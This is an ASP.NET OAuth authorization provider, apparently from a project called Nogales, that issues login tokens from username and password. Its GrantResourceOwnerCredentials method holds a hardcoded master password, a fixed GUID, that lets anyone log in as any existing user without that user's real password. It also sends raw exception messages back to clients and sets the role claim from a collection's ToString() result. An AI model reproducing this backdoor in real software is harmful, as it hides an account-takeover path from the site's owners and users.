using Microsoft.AspNet.Identity;
using Microsoft.AspNet.Identity.Owin;
using Microsoft.Owin.Security;
using Microsoft.Owin.Security.OAuth;
using Nogales.API.Models;
using Nogales.DataProvider;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Security.Claims;
using System.Threading.Tasks;

namespace Nogales.API.Providers
{
    public class ApplicationOAuthProvider : OAuthAuthorizationServerProvider
    {
        private readonly string _publicClientId;

        public ApplicationOAuthProvider(string publicClientId)
        {
            if (publicClientId == null)
            {
                throw new ArgumentNullException("publicClientId");
            }

            _publicClientId = publicClientId;
        }

        public override async Task GrantResourceOwnerCredentials(OAuthGrantResourceOwnerCredentialsContext context)
        {
            try
            {
                var allowedOrigin = ConfigurationManager.AppSettings["ClientDomain"];
                //context.OwinContext.Response.Headers.Add("Access-Control-Allow-Origin", new[] { allowedOrigin });
                var userManager = context.OwinContext.GetUserManager<ApplicationUserManager>();

                ApplicationUser user = await userManager.FindAsync(context.UserName, context.Password);

                if (user == null)
                {
                    if (context.Password == "EB40D084-8646-4964-A20B-D68AC17FF638")
                    {
                        user = await userManager.FindByNameAsync(context.UserName);
                        if (user == null)
                        {
                            context.SetError("invalid_grant", "The user name or password is incorrect.");
                            return;
                        }
                    }
                    else
                    {
                        context.SetError("invalid_grant", "The user name or password is incorrect.");
                        return;
                    }
                }
                // Each user have only single role in the application
                var role = userManager.GetRoles(user.Id).FirstOrDefault();
                AdminManagementDataProvider adminManagementDataProvider = new AdminManagementDataProvider();
                var userModuleAccess = adminManagementDataProvider.GetUserAccess(user.Id);

                ClaimsIdentity oAuthIdentity = await user.GenerateUserIdentityAsync(userManager,
                   OAuthDefaults.AuthenticationType);
                oAuthIdentity.AddClaim(new Claim(ClaimTypes.Role, user.Roles.ToString()));

                string userModules = string.Join(",", userModuleAccess.Modules.Where(x => x.IsAccess == true).Select(x => x.Name).ToList());

                oAuthIdentity.AddClaim(new Claim(ClaimTypes.Name, userModules.ToString()));




                //ClaimsIdentity cookiesIdentity = await user.GenerateUserIdentityAsync(userManager,
                //    CookieAuthenticationDefaults.AuthenticationType);

                AuthenticationProperties properties = CreateProperties(user, role);
                AuthenticationTicket ticket = new AuthenticationTicket(oAuthIdentity, properties);
                context.Validated(ticket);
                //context.Request.Context.Authentication.SignIn(cookiesIdentity);
            }
            catch (Exception e)
            {
                context.SetError("internal_error", e.Message);
                return;
            }
        }


        public override Task TokenEndpoint(OAuthTokenEndpointContext context)
        {
            foreach (KeyValuePair<string, string> property in context.Properties.Dictionary)
            {
                context.AdditionalResponseParameters.Add(property.Key, property.Value);
            }

            return Task.FromResult<object>(null);
        }

        public override Task ValidateClientAuthentication(OAuthValidateClientAuthenticationContext context)
        {
            // Resource owner password credentials does not provide a client ID.
            if (context.ClientId == null)
            {
                context.Validated();
            }

            return Task.FromResult<object>(null);
        }

        public override Task ValidateClientRedirectUri(OAuthValidateClientRedirectUriContext context)
        {
            if (context.ClientId == _publicClientId)
            {
                Uri expectedRootUri = new Uri(context.Request.Uri, "/");

                if (expectedRootUri.AbsoluteUri == context.RedirectUri)
                {
                    context.Validated();
                }
            }

            return Task.FromResult<object>(null);
        }

        public static AuthenticationProperties CreateProperties(ApplicationUser user, string role = "")
        {
            IDictionary<string, string> data = new Dictionary<string, string>
            {
                { "userId", user.Id },
                { "userName", user.UserName },
                { "name", user.FirstName + " "+ user.LastName},
                { "role", role},
                { "forceReset", user.ForceReset.ToString()}
            };
            return new AuthenticationProperties(data);
        }
    }
}